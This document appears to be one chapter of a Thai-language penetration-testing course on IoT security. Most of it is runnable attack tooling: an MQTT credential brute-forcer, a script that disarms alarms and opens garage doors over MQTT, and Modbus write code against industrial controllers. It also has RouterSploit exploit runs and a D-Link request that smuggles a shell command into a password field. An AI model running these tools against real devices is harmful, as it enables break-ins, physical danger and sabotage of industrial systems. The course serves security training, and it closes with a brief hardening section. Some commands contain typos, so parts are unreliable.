# Part 61: IoT Security

## สารบัญ
1. [IoT Security Overview](#iot-overview)
2. [IoT Reconnaissance](#iot-recon)
3. [Firmware Analysis](#firmware-analysis)
4. [Hardware Hacking](#hardware-hacking)
5. [Network Protocol Attacks](#protocol-attacks)
6. [MQTT Exploitation](#mqtt)
7. [Industrial Control Systems (ICS/SCADA)](#ics-scada)
8. [Smart Home Attacks](#smart-home)
9. [IoT Exploitation Frameworks](#frameworks)
10. [Defense และ Hardening](#defense)

---

## 1. IoT Security Overview {#iot-overview}

```
IoT Attack Surface:

┌───────────────────────────────────────────┐
│          IoT Device                          │
├───────────┬───────────┬───────────────────┤
│  Hardware  │  Firmware   │   Interfaces        │
├───────────┼───────────┼───────────────────┤
│ • UART    │ • Hardcoded│ • Web (HTTP/HTTPS)  │
│ • JTAG    │   creds    │ • SSH/Telnet        │
│ • FLASH   │ • Backdoor │ • MQTT/CoAP         │
│ • Chips   │ • Old OS   │ • Zigbee/Z-Wave     │
│ • SoC     │ • No crypt │ • Bluetooth         │
└───────────┴───────────┴───────────────────┘
```

### OWASP IoT Top 10

```
OWASP IoT Top 10 (2018):
1. Weak/Guessable/Hardcoded Passwords
2. Insecure Network Services
3. Insecure Ecosystem Interfaces
4. Lack of Secure Update Mechanism
5. Use of Insecure/Outdated Components
6. Insufficient Privacy Protection
7. Insecure Data Transfer and Storage
8. Lack of Device Management
9. Insecure Default Settings
10. Lack of Physical Hardening
```

---

## 2. IoT Reconnaissance {#iot-recon}

### Shodan IoT Search

```bash
# Shodan searches สำหรับ IoT devices

# IP Cameras
shodan search 'product:"Hikvision" country:TH'
shodan search 'Server: Camera-Webs'
shodan search 'title:"Network Camera" -screenshot.label:blank'
shodan search 'has_screenshot:true webcam'

# Routers
shodan search 'D-Link' port:80 country:TH
shodan search 'product:"MikroTik"'
shodan search 'product:"ZyXEL"'

# Industrial systems
shodan search 'product:"Siemens" port:102'  # Siemens S7
shodan search 'port:502'  # Modbus
shodan search 'product:"Allen-Bradley"'  # Rockwell

# Building automation
shodan search 'port:47808'  # BACnet
shodan search 'product:"Niagara"'  # JACE controllers

# Default credentials
shodan search 'Default password' country:TH

# สร้าง search สำหรับ network range
shodan search 'net:203.150.0.0/16' port:8080
```

### Network Discovery

```bash
# Nmap สำหรับ IoT devices
nmap -sV --script banner 192.168.1.0/24

# ค้นหา MQTT
nmap -p 1883,8883 192.168.1.0/24

# CoAP discovery
nmap -sU -p 5683 192.168.1.0/24

# Zigbee coordinator
nmap -sV --script zigbee* 192.168.1.0/24

# ค้นหา IoT-specific ports
nmap -p 80,443,22,23,8080,8443,1883,5683,47808,102,502 192.168.1.0/24

# arp-scan สำหรับ local discovery
arp-scan --localnet
arp-scan -I eth0 192.168.1.0/24

# หา MAC address vendor (IoT OUI)
arp -a | awk '{print $4}' | sort -u
# Lookup: https://macvendors.com/

# IoT scanner specialized tool
nmap --script iot-info 192.168.1.1
```

### Device Fingerprinting

```python
#!/usr/bin/env python3
# iot_fingerprinter.py

import socket
import requests
import json

class IoTFingerprinter:
    def __init__(self, target_ip):
        self.ip = target_ip
        self.fingerprint = {}
    
    def check_web_interface(self):
        """ตรวจสอบ web interface"""
        ports = [80, 443, 8080, 8443, 8888]
        for port in ports:
            try:
                url = f"http://{self.ip}:{port}"
                r = requests.get(url, timeout=3, verify=False)
                self.fingerprint['web'] = {
                    'port': port,
                    'title': self._extract_title(r.text),
                    'server': r.headers.get('Server', ''),
                    'status': r.status_code
                }
                break
            except:
                pass
    
    def check_telnet(self):
        """ตรวจสอบ Telnet"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.ip, 23))
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            self.fingerprint['telnet'] = {'banner': banner}
            s.close()
        except:
            pass
    
    def check_mqtt(self):
        """ตรวจสอบ MQTT"""
        import paho.mqtt.client as mqtt
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                self.fingerprint['mqtt'] = {'status': 'open', 'auth': False}
            elif rc == 5:
                self.fingerprint['mqtt'] = {'status': 'open', 'auth': True}
        
        client = mqtt.Client()
        client.on_connect = on_connect
        try:
            client.connect(self.ip, 1883, 3)
            client.loop_start()
            import time; time.sleep(2)
            client.loop_stop()
        except:
            pass
    
    def identify_device(self):
        """Identify device type from fingerprints"""
        signatures = {
            'Hikvision': ['Hikvision', 'NVR', 'DVR', 'webcam'],
            'Dahua': ['Dahua', 'DH-'],
            'D-Link': ['D-Link', 'DCS-', 'DIR-'],
            'Netgear': ['NETGEAR', 'ReadyNAS'],
            'MikroTik': ['MikroTik', 'RouterOS'],
        }
        
        for device, keywords in signatures.items():
            info_str = json.dumps(self.fingerprint).lower()
            if any(kw.lower() in info_str for kw in keywords):
                return device
        return 'Unknown'
    
    def _extract_title(self, html):
        import re
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else ''
    
    def run(self):
        self.check_web_interface()
        self.check_telnet()
        self.check_mqtt()
        device_type = self.identify_device()
        
        print(f"[+] Device: {self.ip}")
        print(f"[+] Type: {device_type}")
        print(f"[+] Fingerprint: {json.dumps(self.fingerprint, indent=2)}")
        return self.fingerprint

# ใช้งาน:
f = IoTFingerprinter('192.168.1.100')
f.run()
```

---

## 3. Firmware Analysis {#firmware-analysis}

### Firmware Extraction

```bash
# วิธีการดึง firmware

# 1. ดาวน์โหลดจากเว็บ vendor
wget https://www.vendor.com/firmware/device_fw_v2.0.bin

# 2. UART/JTAG extraction
# เชื่อมต่อ UART port แล้วใช้ minicom
screen /dev/ttyUSB0 115200
# login: root (default)
# หรือ dump flash ผ่าน dd
dd if=/dev/mtd0 of=/tmp/firmware.bin bs=1024

# 3. Flash chip desoldering และอ่านด้วย CH341A programmer
flashrom -p ch341a_spi -r firmware.bin

# 4. ดึงผ่าน update package
# OTA files มักเป็น .zip หรือ .tar.gz
unzip device_ota.zip
```

### Binwalk Analysis

```bash
# binwalk - เครื่องมืออันดับต้นสำหรับ firmware analysis
apt install binwalk

# สแกน firmware
binwalk firmware.bin

# Output:
# DECIMAL  HEX     DESCRIPTION
# 0        0x0     LZMA compressed data
# 135000   0x20F18 Squashfs filesystem, little endian
# 2300000  0x231860 JFFS2 filesystem

# Extract filesystem
binwalk -e firmware.bin
ls _firmware.bin.extracted/

# เส้นหา squashfs
unsquashfs squashfs-root.sqfs
ls squashfs-root/

# วิเคราะห์ entropy
binwalk -E firmware.bin  # high entropy = encrypted

# Deep recursive extraction
binwalk -Me firmware.bin
```

### Static Firmware Analysis

```bash
# หา hardcoded credentials
grep -r "password" squashfs-root/ 2>/dev/null | grep -v Binary
grep -r "passwd" squashfs-root/etc/ 2>/dev/null
grep -r "admin" squashfs-root/etc/passwd 2>/dev/null

# ดู shadow file
cat squashfs-root/etc/shadow
# root:$1$xyz$hashhash:0:0:99999:7:::
# hashcat -m 500 hash.txt wordlist.txt

# หา private keys
find squashfs-root/ -name '*.pem' -o -name '*.key' -o -name '*.crt' 2>/dev/null
grep -r 'BEGIN PRIVATE KEY' squashfs-root/ 2>/dev/null

# เส้นหา API keys / tokens
grep -r 'api_key\|api_secret\|token\|secret' squashfs-root/ 2>/dev/null

# วิเคราะห์ configuration files
find squashfs-root/ -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null
cat squashfs-root/etc/config/system

# strings analysis
strings firmware.bin | grep -E '(pass|user|admin|root|key)' | head -50

# ดู startup scripts
cat squashfs-root/etc/init.d/rcS
ls squashfs-root/etc/rc.d/

# หา hardcoded IPs/URLs
strings firmware.bin | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
strings firmware.bin | grep -E 'https?://'
```

### Dynamic Firmware Analysis with QEMU

```bash
# จำลองรัน firmware ด้วย QEMU (emulation)
apt install qemu-user-static

# ค้นหา architecture
file squashfs-root/bin/busybox
# busybox: ELF 32-bit LSB executable, ARM, EABI5

# MIPS firmware emulation
copy qemu-mipsel-static ไป squashfs-root
cp /usr/bin/qemu-mipsel-static squashfs-root/

# chroot เข้าไป firmware
chroot squashfs-root/ ./qemu-mipsel-static /bin/sh

# FirmAE - automated firmware emulation
git clone https://github.com/pr0v3rbs/FirmAE
cd FirmAE && ./setup.sh
./run.sh -r firmware.bin  # full emulation
./run.sh -a firmware.bin  # analysis mode

# ถ้า emulate สำเร็จ → สามารถ scan web interface
nmap -sV 192.168.0.1  # emulated device IP
```

---

## 4. Hardware Hacking {#hardware-hacking}

### UART Serial Interface

```bash
# UART - Universal Asynchronous Receiver/Transmitter
# หา TX, RX, GND pins บน PCB

# เครื่องมือ:
# - USB-to-Serial adapter (CP2102, CH340)
# - Logic analyzer (หา baud rate)
# - Multimeter

# และหา baud rate ด้วย logic analyzer
# หรือลอง common rates: 9600, 115200, 57600, 38400

# เชื่อมต่อ:
# USB-to-Serial TX → Device RX
# USB-to-Serial RX → Device TX
# GND → GND

# เข้าถึง serial console
screen /dev/ttyUSB0 115200
picocom -b 115200 /dev/ttyUSB0

# minicom
minicom -s  # configure
# Serial port: /dev/ttyUSB0
# Baud rate: 115200
# Hardware flow control: No

# เมื่อเข้าถึงได้ → root shell!
# หรือโปรแกรม telnet เปิดอยู่
```

### JTAG Debugging

```bash
# JTAG - Joint Test Action Group
# ใช้สำหรับ debug และ flash firmware

# หา JTAG pins: TDI, TDO, TMS, TCK, TRST (optional)
# Tools: Bus Pirate, J-Link, OpenOCD

# JTAGulator - อัตโนมัติหา JTAG pins
# Connect to USB, run JTAGulator firmware

# OpenOCD - open source JTAG
apt install openocd

# ตัวอย่าง config สำหรับ Raspberry Pi target
cat openocd.cfg
"source [find interface/raspberrypi2-native.cfg]"
"source [find target/bcm2711.cfg]"

# เริ่มต่อ
opencod -f openocd.cfg

# Telnet interface
telnet localhost 4444
> halt
> dump_image firmware.bin 0x0 0x1000000
> flash write_image firmware_new.bin 0x0
```

### I2C/SPI Bus Analysis

```python
#!/usr/bin/env python3
# i2c_scanner.py - สแกนหา I2C devices

import smbus2

def scan_i2c_bus(bus_number=1):
    bus = smbus2.SMBus(bus_number)
    devices = []
    
    for addr in range(0x03, 0x78):
        try:
            bus.read_byte(addr)
            devices.append(hex(addr))
            print(f"[+] Found device at address: {hex(addr)}")
        except:
            pass
    
    bus.close()
    return devices

# Common I2C addresses:
# 0x27 - PCF8574 I/O expander (LCD)
# 0x3C - SSD1306 OLED display
# 0x48 - ADS1115 ADC
# 0x68 - MPU6050 accelerometer / DS3231 RTC
# 0x76 - BME280 environment sensor

if __name__ == '__main__':
    print("Scanning I2C bus...")
    devices = scan_i2c_bus()
    print(f"Found {len(devices)} devices: {devices}")

# EEPROM dumping via I2C
python3 << 'EOF'
import smbus2

bus = smbus2.SMBus(1)
eeprom_addr = 0x50  # AT24C32 EEPROM

data = []
for i in range(0, 256, 16):
    chunk = bus.read_i2c_block_data(eeprom_addr, i, 16)
    data.extend(chunk)
    print(f"0x{i:04x}: {' '.join(f'{b:02x}' for b in chunk)}")

with open('eeprom_dump.bin', 'wb') as f:
    f.write(bytes(data))
EOF
```

---

## 5. Network Protocol Attacks {#protocol-attacks}

### MQTT Exploitation

```bash
# MQTT - Message Queuing Telemetry Transport
# ใช้สำหรับ IoT messaging

# ติดตั้ง mosquitto tools
apt install mosquitto mosquitto-clients

# สแกน MQTT broker
nmap -p 1883,8883 192.168.1.0/24

# เชื่อมต่อ MQTT broker (ไม่มี auth)
mosquitto_sub -h 192.168.1.100 -p 1883 -t '#' -v
# # = wildcard สมัคร all topics

# เชื่อมต่อแบบระบุ credentials
mosquitto_sub -h 192.168.1.100 -u admin -P password -t '#' -v

# ส่งข้อความ
 mosquitto_pub -h 192.168.1.100 -t 'home/light/living' -m 'ON'

# ส่งคำสั่ง command (ถ้า device ฟัง)
mosquitto_pub -h 192.168.1.100 \
              -t 'home/camera/cmd' \
              -m '{"cmd":"reboot"}'

# Brute force MQTT credentials
python3 mqtt_brute.py 192.168.1.100
```

### MQTT Brute Forcer

```python
#!/usr/bin/env python3
# mqtt_brute.py

import paho.mqtt.client as mqtt
import time
import sys

class MQTTBruteForce:
    def __init__(self, host, port=1883):
        self.host = host
        self.port = port
        self.found = False
    
    def try_credentials(self, username, password):
        result = {'connected': False}
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                result['connected'] = True
            elif rc == 5:
                result['auth_failed'] = True
        
        client = mqtt.Client()
        client.on_connect = on_connect
        client.username_pw_set(username, password)
        
        try:
            client.connect(self.host, self.port, 3)
            client.loop_start()
            time.sleep(1.5)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            pass
        
        return result.get('connected', False)
    
    def brute_force(self, cred_list):
        for username, password in cred_list:
            print(f"[*] Trying {username}:{password}")
            if self.try_credentials(username, password):
                print(f"[+] FOUND: {username}:{password}")
                self.found = True
                return username, password
        return None, None
    
    def enumerate_topics(self, username=None, password=None):
        """เก็บ topics ที่พบ"""
        topics_found = set()
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                client.subscribe('#')
        
        def on_message(client, userdata, msg):
            topics_found.add(msg.topic)
            print(f"[+] Topic: {msg.topic} = {msg.payload[:100]}")
        
        client = mqtt.Client()
        client.on_connect = on_connect
        client.on_message = on_message
        
        if username:
            client.username_pw_set(username, password)
        
        client.connect(self.host, self.port, 3)
        client.loop_start()
        time.sleep(10)  # รอ 10 วินาที
        client.loop_stop()
        
        return topics_found

# Default credentials สำหรับ MQTT
default_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '1234'),
    ('mqtt', 'mqtt'),
    ('mosquitto', 'mosquitto'),
    ('', ''),  # no auth
    ('user', 'user'),
]

if len(sys.argv) > 1:
    bruter = MQTTBruteForce(sys.argv[1])
    
    # ลอง no auth
    if bruter.try_credentials('', ''):
        print("[+] No authentication required!")
        topics = bruter.enumerate_topics()
    else:
        user, pwd = bruter.brute_force(default_creds)
        if user:
            topics = bruter.enumerate_topics(user, pwd)
```

### CoAP Protocol Testing

```bash
# CoAP - Constrained Application Protocol
# ใช้ใน low-power IoT devices (UDP port 5683)

# ติดตั้ง coap-client
apt install libcoap-bin

# Discover resources
coap-client -m get -T coap://192.168.1.100/.well-known/core

# อ่านค่า sensor
coap-client -m get coap://192.168.1.100/sensors/temp

# เวลา response:
# 2.05 Content
# {"temperature": 25.3, "unit": "C"}

# เขียนค่า
coap-client -m put -e '{"relay":"ON"}' coap://192.168.1.100/actuators/relay

# CoAP scan
nmap -sU -p 5683 --script coap-resources 192.168.1.0/24

# Fuzzing CoAP
python3 -c "
import socket
# CoAP GET request
payload = b'\x40\x01\x00\x01\xbb.well-known\x04core'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload, ('192.168.1.100', 5683))
print(s.recv(1024))
"
```

### Zigbee/Z-Wave Attacks

```bash
# Zigbee - short-range wireless protocol
# ใช้ใน smart home, industrial

# Tools: 
# - Ubertooth One (Bluetooth)
# - YARD Stick One (sub-GHz)
# - CC2531 USB stick (Zigbee)

# Wireshark Zigbee capture
# ต้อง configure CC2531 dongle

# KillerBee - Zigbee security tools
pip install killerbee

# สแกน Zigbee networks
zbstumbler  # แสดง networks ที่พบ

# ดักฟัง Zigbee traffic
zbdump -w capture.pcap

# Replay attack
zbreplay -f capture.pcap  # replay captured packets

# Z-Wave attacks
# Open Z-Wave project
apt install open-zwave

# สแกน Z-Wave devices
OZWDev list-devices
```

---

## 6. MQTT Exploitation {#mqtt}

### MQTT Command Injection

```python
#!/usr/bin/env python3
# mqtt_attack.py - โจมตีผ่าน MQTT

import paho.mqtt.client as mqtt
import json
import time

class MQTTAttacker:
    def __init__(self, host, port=1883):
        self.client = mqtt.Client()
        self.host = host
        self.port = port
        self.received = []
        
        self.client.on_message = self._on_message
        self.client.connect(host, port)
        self.client.loop_start()
    
    def _on_message(self, client, userdata, msg):
        self.received.append({
            'topic': msg.topic,
            'payload': msg.payload.decode('utf-8', errors='ignore'),
            'time': time.time()
        })
    
    def subscribe_all(self):
        """สมัครการ topic ทั้งหมด"""
        self.client.subscribe('#')  # wildcard
        self.client.subscribe('$SYS/#')  # system stats
        print("[*] Subscribed to all topics")
        time.sleep(5)
    
    def inject_command(self, topic, command):
        """ส่งคำสั่งไปยัง device"""
        print(f"[*] Publishing to {topic}: {command}")
        self.client.publish(topic, command)
    
    def smart_home_takeover(self):
        """ควบคุมอุปกรณ์ smart home"""
        commands = [
            # ปิดไฟทั้งหมด
            ('home/lights/all', 'OFF'),
            # เปิด garage door
            ('home/garage/door', 'OPEN'),
            # ปิด alarm
            ('home/alarm', 'DISARM'),
            # เปิด thermostat สูง
            ('home/hvac/setpoint', '35'),
        ]
        
        for topic, cmd in commands:
            self.inject_command(topic, cmd)
            time.sleep(0.5)
    
    def scan_topics(self, duration=30):
        """เก็บรวบ topics ที่พบ"""
        self.subscribe_all()
        time.sleep(duration)
        
        topics = {}
        for msg in self.received:
            topic = msg['topic']
            if topic not in topics:
                topics[topic] = []
            topics[topic].append(msg['payload'])
        
        print(f"\n[+] Discovered {len(topics)} topics:")
        for t, payloads in topics.items():
            print(f"  {t}: {payloads[-1][:100]}")
        
        return topics

# ใช้งาน:
attacker = MQTTAttacker('192.168.1.100')
topics = attacker.scan_topics(10)
```

---

## 7. Industrial Control Systems (ICS/SCADA) {#ics-scada}

### Modbus Protocol

```python
#!/usr/bin/env python3
# modbus_scan.py - สแกน Modbus devices

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException
import sys

def scan_modbus(host, port=502):
    print(f"[*] Scanning Modbus at {host}:{port}")
    
    client = ModbusTcpClient(host, port=port)
    
    if not client.connect():
        print(f"[-] Cannot connect to {host}:{port}")
        return
    
    print(f"[+] Connected to Modbus at {host}:{port}")
    
    # อ่าน coils (digital outputs)
    print("\n[*] Reading Coils (FC01):")
    result = client.read_coils(0, 16, unit=1)
    if not result.isError():
        print(f"  Coils: {result.bits[:16]}")
    
    # อ่าน discrete inputs
    print("\n[*] Reading Discrete Inputs (FC02):")
    result = client.read_discrete_inputs(0, 16, unit=1)
    if not result.isError():
        print(f"  Inputs: {result.bits[:16]}")
    
    # อ่าน holding registers
    print("\n[*] Reading Holding Registers (FC03):")
    result = client.read_holding_registers(0, 16, unit=1)
    if not result.isError():
        print(f"  Registers: {result.registers}")
    
    # อ่าน input registers
    print("\n[*] Reading Input Registers (FC04):")
    result = client.read_input_registers(0, 16, unit=1)
    if not result.isError():
        print(f"  Input Regs: {result.registers}")
    
    client.close()

def modbus_write_attack(host, port=502):
    """สาธิตการเขียน Modbus (อันตราย - ทำใน isolated lab เท่านั้น)"""
    client = ModbusTcpClient(host, port=port)
    client.connect()
    
    # เขียน coil (เปิด/ปิด output)
    # FC05 - Write Single Coil
    result = client.write_coil(0, True, unit=1)  # เปิด coil 0
    print(f"[*] Write coil result: {result}")
    
    # FC06 - Write Single Register
    result = client.write_register(40001, 100, unit=1)
    print(f"[*] Write register result: {result}")
    
    client.close()

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.100'
    scan_modbus(host)
```

### Siemens S7 Protocol

```python
#!/usr/bin/env python3
# s7_scan.py - สแกน Siemens S7 PLCs

import snap7
from snap7.util import *
import sys

def scan_s7_plc(host, port=102):
    print(f"[*] Attempting S7 connection to {host}:{port}")
    
    client = snap7.client.Client()
    
    try:
        # rack=0, slot=1 สำหรับ S7-300
        # rack=0, slot=2 สำหรับ S7-400
        client.connect(host, 0, 1)
        
        print("[+] Connected to S7 PLC!")
        
        # อ่าน CPU info
        info = client.get_cpu_info()
        print(f"[+] PLC Type: {info.ModuleTypeName}")
        print(f"[+] Serial: {info.SerialNumber}")
        print(f"[+] AS Name: {info.ASName}")
        
        # อ่าน CPU state
        state = client.get_cpu_state()
        print(f"[+] CPU State: {state}")
        
        # อ่าน data blocks
        for db_num in range(1, 100):
            try:
                db_info = client.db_get(db_num)
                data = client.db_read(db_num, 0, 10)
                print(f"[+] DB{db_num}: {data.hex()}")
            except:
                pass
        
        client.disconnect()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.100'
    scan_s7_plc(host)
```

---

## 8. Smart Home Attacks {#smart-home}

### Tuya/Smart Life Analysis

```python
#!/usr/bin/env python3
# tuya_scanner.py

import tinytuya
import json

# สแกน Tuya devices ใน local network
print("[*] Scanning for Tuya devices...")
devices = tinytuya.deviceScan(verbose=False)

for ip, data in devices.items():
    print(f"\n[+] Found Tuya device: {ip}")
    print(f"  Device ID: {data.get('gwId', 'Unknown')}")
    print(f"  Product: {data.get('productKey', 'Unknown')}")
    print(f"  Version: {data.get('version', 'Unknown')}")

# เชื่อมต่อ และควบคุม (ต้องมี device key)
if devices:
    ip = list(devices.keys())[0]
    dev_id = devices[ip]['gwId']
    
    # สร้าง device object
    d = tinytuya.BulbDevice(dev_id, ip, local_key='YOUR_LOCAL_KEY')
    d.set_version(3.3)
    
    # อ่าน status
    status = d.status()
    print(f"\n[+] Device status: {json.dumps(status, indent=2)}")
    
    # เปิด/ปิด device
    d.turn_on()
    d.turn_off()

# ตรวจสอบ cloud traffic
# Tuya devices ใช้ AWS สำหรับ backend
# Intercept ด้วย Burp Suite / mitmproxy
```

### Router Exploitation

```bash
# Default credential testing
curl -s http://192.168.1.1/ | grep -i 'login\|password\|admin'

# RouterSploit - IoT/Router exploitation framework
pip3 install routersploit
rsf

rsf > use scanners/autopwn
rsf (AutoPwn) > set TARGET 192.168.1.1
rsf (AutoPwn) > run

# หรือเลือก module เฉพาะ
rsf > use exploits/routers/linksys/e1500_e2500_rce
rsf (E1500/E2500 RCE) > set TARGET 192.168.1.1
rsf (E1500/E2500 RCE) > check
rsf (E1500/E2500 RCE) > run

# หา CVEs สำหรับ router model
searchsploit "D-Link DIR-"
searchsploit "Netgear"  

# ตัวอย่าง D-Link DIR-645 RCE
curl -X POST 'http://192.168.0.1/apply_sec.cgi' \
     --data-urlencode 'html_response_page=login_pic.asp' \
     --data-urlencode 'action=login&password=$(cat /etc/passwd)'
```

---

## 9. IoT Exploitation Frameworks {#frameworks}

### RouterSploit Deep Dive

```bash
# RouterSploit modules overview
rsf > show modules

# Modules:
# exploits/routers/ - router exploits
# exploits/cameras/ - IP camera exploits
# exploits/printers/ - printer exploits
# creds/routers/ - credential testing
# scanners/ - device scanning

# สแกน camera
rsf > use scanners/cameras/camera_scan
rsf (Camera Scan) > set TARGET 192.168.1.0/24
rsf (Camera Scan) > run

# โจมตี Hikvision (CVE-2021-36260)
rsf > use exploits/cameras/hikvision/cve_2021_36260
rsf > set TARGET 192.168.1.100
rsf > run

# Exploit Axis cameras
rsf > use exploits/cameras/axis/m_11xx_bof
rsf > set TARGET 192.168.1.100
rsf > run
```

### Automated IoT Scanner

```python
#!/usr/bin/env python3
# iot_auto_scanner.py - สแกนอัตโนมัติ

import subprocess
import json
import socket
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class IoTScanner:
    def __init__(self, network):
        self.network = network
        self.targets = []
        self.vulnerable = []
    
    def discover_hosts(self):
        """ค้นหา live hosts"""
        result = subprocess.run(
            ['nmap', '-sn', self.network, '-oG', '-'],
            capture_output=True, text=True
        )
        for line in result.stdout.split('\n'):
            if 'Up' in line:
                ip = line.split()[1]
                self.targets.append(ip)
        print(f"[+] Found {len(self.targets)} hosts")
        return self.targets
    
    def check_default_creds(self, ip):
        """ทดสอบ default credentials"""
        default_creds = [
            ('admin', 'admin'),
            ('admin', '1234'),
            ('admin', 'password'),
            ('admin', ''),
            ('root', 'root'),
            ('root', 'admin'),
            ('guest', 'guest'),
        ]
        
        # ลองเชื่อมต่อ web interface
        for port in [80, 8080, 443, 8443]:
            try:
                url = f"http://{ip}:{port}/"
                r = requests.get(url, timeout=3, verify=False)
                
                for user, pwd in default_creds:
                    try:
                        auth_r = requests.get(
                            url, auth=(user, pwd),
                            timeout=3, verify=False
                        )
                        if auth_r.status_code == 200 and 'login' not in auth_r.url.lower():
                            return {'ip': ip, 'port': port, 'user': user, 'pass': pwd}
                    except:
                        pass
            except:
                pass
        return None
    
    def check_telnet(self, ip):
        """ตรวจสอบ open telnet"""
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((ip, 23))
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            s.close()
            return {'ip': ip, 'service': 'telnet', 'banner': banner[:100]}
        except:
            return None
    
    def check_mqtt(self, ip):
        """ตรวจสอบ open MQTT"""
        try:
            import paho.mqtt.client as mqtt
            result = {'connected': False}
            
            def on_connect(c, u, f, rc):
                result['connected'] = (rc == 0)
                result['auth_required'] = (rc == 5)
            
            c = mqtt.Client()
            c.on_connect = on_connect
            c.connect_async(ip, 1883, 3)
            c.loop_start()
            import time; time.sleep(2)
            c.loop_stop()
            
            if result.get('connected'):
                return {'ip': ip, 'service': 'mqtt', 'auth': False}
        except:
            pass
        return None
    
    def run_full_scan(self):
        self.discover_hosts()
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            # Default credentials
            futures = {executor.submit(self.check_default_creds, ip): ip 
                      for ip in self.targets}
            for future in futures:
                result = future.result()
                if result:
                    print(f"[VULN] Default creds: {result}")
                    self.vulnerable.append(result)
        
        print(f"\n[+] Scan complete. {len(self.vulnerable)} vulnerable devices found.")
        return self.vulnerable

# ใช้งานใน authorized environment:
scanner = IoTScanner('192.168.1.0/24')
vulns = scanner.run_full_scan()
```

---

## 10. Defense และ Hardening {#defense}

### IoT Security Hardening

```bash
# IoT Security Best Practices

# 1. Network Segmentation
cat << 'NETWORK'
# แบ่ง network:
# VLAN 10: Corporate (computers)
# VLAN 20: IoT devices
# VLAN 30: Guest WiFi
# Firewall rules: ห้าม IoT VLAN เข้า Corporate VLAN
NETWORK

# 2. Change default credentials
# หลังติดตั้ง เปลี่ยน password ทันที

# 3. Disable unnecessary services
# เช่น Telnet, UPnP, WPS, remote management

# 4. Firmware updates
# อัพเดต firmware สม่ำเสมอ
# ติดตาม vendor security bulletins

# 5. ตรวจสอบ physical security
# เข้าถึง UART/JTAG ทาง physical

# MQTT Hardening
cat mosquitto.conf
listener 8883  # TLS only
cafile /etc/mosquitto/ca.crt
certfile /etc/mosquitto/server.crt
keyfile /etc/mosquitto/server.key
require_certificate true

password_file /etc/mosquitto/passwd
allow_anonymous false

# ACL file
aclfile /etc/mosquitto/acl
# user sensor1
# topic read home/sensors/#
# topic write home/sensors/temp
```

### IoT Security Assessment Checklist

```
IoT Security Assessment Checklist:

Network:
☐ Network isolation (VLAN, firewall)
☐ Open ports audit
☐ Unencrypted protocols
☐ Default credentials

Firmware:
☐ Hardcoded credentials
☐ Outdated OS/libraries
☐ Insecure update mechanism
☐ Debug interfaces enabled

Hardware:
☐ UART/JTAG exposed
☐ Flash chip accessible
☐ Debug headers present

Application:
☐ Web interface vulnerabilities
☐ API security
☐ Authentication/authorization
☐ Certificate validation
```

---

## แบบฝึกหัด - IoT Security Lab

```bash
# Lab: ติดตั้ง IoT test environment

# 1. ติดตั้ง VulnHub IoT VM หรือ
# Damn Vulnerable IoT Device (DVID)
git clone https://github.com/Vulcainreo/DVID
cd DVID && docker-compose up

# 2. ติดตั้ง MQTT broker
aptinstall mosquitto
# เปิด anonymous access
echo 'allow_anonymous true' >> /etc/mosquitto/mosquitto.conf
service mosquitto start

# 3. ทดสอบ MQTT
mosquitto_sub -h localhost -t '#' -v &
mosquitto_pub -h localhost -t 'test/sensor' -m '25.3'

# 4. Firmware analysis ด้วย Binwalk
binwalk -Me sample_firmware.bin

# 5. หา hardcoded credentials
grep -r 'admin\|password\|secret' squashfs-root/ 2>/dev/null
```

---

## สรุป

| Attack Type | Tools | Impact |
|------------|-------|--------|
| Firmware Analysis | binwalk, qemu | High |
| MQTT Hijacking | mosquitto-clients | High |
| Default Credentials | routersploit | High |
| UART Shell | screen, minicom | Critical |
| RFID Cloning | Proxmark3 | High |
| Zigbee Sniffing | KillerBee | Medium |
| Modbus Attack | pymodbus | Critical |

---

← [Part 60: Physical Security](Part-60-Physical-Security.md) | [Part 62: Cryptography Attacks](Part-62-Crypto-Attacks.md) →
